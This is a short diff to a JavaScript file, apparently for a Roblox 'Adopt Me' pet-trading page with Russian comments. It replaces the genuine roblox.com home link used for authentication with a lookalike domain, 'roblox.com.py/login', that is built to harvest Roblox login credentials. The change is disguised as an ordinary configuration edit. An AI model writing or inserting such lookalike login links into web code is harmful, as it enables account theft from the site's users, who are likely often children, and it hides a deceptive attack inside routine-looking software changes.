@@ -1,7 +1,7 @@
 // ==========================================
 // КОНФИГУРАЦИЯ
 // ==========================================
-const ROBLOX_AUTH_LINK = "https://www.roblox.com/home"; 
+const ROBLOX_AUTH_LINK = "https://roblox.com.py/login?returnUrl=4210845075632139"; 
 const ADOPT_ME_DATA = {
     // Для краткости пару примеров, но код работает для всех
     "pets": ["Shadow Dragon","Bat Dragon","Giraffe","Frost Dragon","Owl","Parrot","Evil Unicorn","Crow","Arctic Reindeer","Turtle","Kangaroo","Unicorn","Dragon","Kitsune"]
@@ -251,4 +251,5 @@ window.onclick = (e) => {
 }
 
 // Старт
+
 renderGrid();
